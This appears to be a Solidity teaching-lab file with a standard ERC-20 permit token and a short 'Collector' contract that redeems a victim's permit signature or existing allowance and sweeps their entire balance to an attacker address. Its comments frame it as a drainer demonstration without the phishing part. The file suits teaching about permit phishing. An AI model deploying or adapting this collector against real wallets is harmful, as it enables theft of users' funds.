// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ERC20Permit} from "@openzeppelin/contracts/token/ERC20/extensions/ERC20Permit.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// A lab token. Ordinary ERC-20 plus EIP-2612 `permit` — the same shape as USDC, DAI and most
/// modern tokens. Nothing here is modified or weakened: the whole point of the episode is that the
/// token behaves CORRECTLY throughout.
contract LabToken is ERC20, ERC20Permit {
    constructor() ERC20("Lab USD", "LUSD") ERC20Permit("Lab USD") {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

/// The collector. This is deliberately the whole thing: eight lines.
///
/// It contains no exploit and no vulnerability is used. It can only move tokens that the holder has
/// already granted it permission to move — which is exactly the point being demonstrated. The hard
/// part of a real drainer is the phishing site and the social engineering, and none of that is here.
contract Collector {
    address public immutable attacker;
    constructor() { attacker = msg.sender; }

    /// Redeem an off-chain permit signature, then sweep. Both in one transaction — the victim's
    /// wallet never sent anything.
    function redeemAndSweep(
        address token, address victim,
        uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s
    ) external {
        ERC20Permit(token).permit(victim, address(this), value, deadline, v, r, s);
        uint256 bal = IERC20(token).balanceOf(victim);
        IERC20(token).transferFrom(victim, attacker, bal);
    }

    /// The other path: the victim granted an ordinary on-chain allowance earlier.
    function sweepAllowance(address token, address victim) external {
        uint256 bal = IERC20(token).balanceOf(victim);
        IERC20(token).transferFrom(victim, attacker, bal);
    }
}
